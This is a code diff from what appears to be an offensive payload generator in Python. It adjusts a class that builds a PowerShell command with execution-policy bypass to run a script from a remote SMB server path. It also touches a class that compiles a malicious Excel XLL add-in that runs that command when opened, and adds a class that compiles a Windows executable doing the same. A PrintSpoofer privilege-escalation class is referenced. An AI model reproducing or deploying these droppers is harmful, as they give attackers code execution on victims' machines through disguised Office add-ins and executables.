@@ -29,7 +29,7 @@ class PowershellRunner(Payload):
     def generate(self):
         if self.payload:
             return
-        self.payload = f"powershell.exe -ep bypass {self.input_files[0].remote_path}"
+        self.payload = f"powershell.exe -ep bypass -file {self.input_files[0].remote_path_backslashes_double}"
 
 
 class PrintSpoofer(Payload):
@@ -87,6 +87,21 @@ class CRunPowershellXll(Payload):
         self.payload = '#include <windows.h>\n\nvoid xlAutoOpen() {system("'
         self.payload += powershell.payload
         self.payload += '");}'
-        print(self.payload)
         with subprocess.Popen([self.compiler, "-shared", "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
+            process.communicate(input=self.payload.encode())
+
+class CRunPowershellExe(Payload):
+    ext = ".exe"
+    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"
+
+    def __init__(self, smb_server_object, input_files):
+        super().__init__(smb_server_object, make_file=False, input_files=input_files)
+
+    def generate(self):
+        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
+        powershell = PowershellRunner(self.smb_server_object, self.input_files)
+        self.payload = '#include <stdlib.h>\n\nvoid main(int argc, char *argv[]){system("'
+        self.payload += powershell.payload
+        self.payload += '");}'
+        with subprocess.Popen([self.compiler, "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
             process.communicate(input=self.payload.encode())
